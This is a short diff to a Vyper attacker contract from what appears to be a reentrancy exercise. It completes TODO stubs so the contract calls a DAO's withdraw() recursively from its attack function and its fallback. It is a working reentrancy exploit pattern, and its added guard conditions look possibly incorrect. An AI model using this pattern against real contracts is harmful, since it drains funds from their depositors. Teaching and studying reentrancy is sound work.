@@ -16,7 +16,8 @@ def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    DAO(self.dao_address).withdraw()
+    if self.userBalances(self.dao_address) > 0:
+        DAO(self.dao_address).withdraw()
     return True
 
 @external
@@ -44,4 +45,5 @@ def attack(dao_address:address):
 def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     # TODO: Add code here to complete the recursive call
-    DAO(self.owner_address).withdraw()
+    if self.owner_address == self.dao_address:
+        DAO(self.owner_address).withdraw()
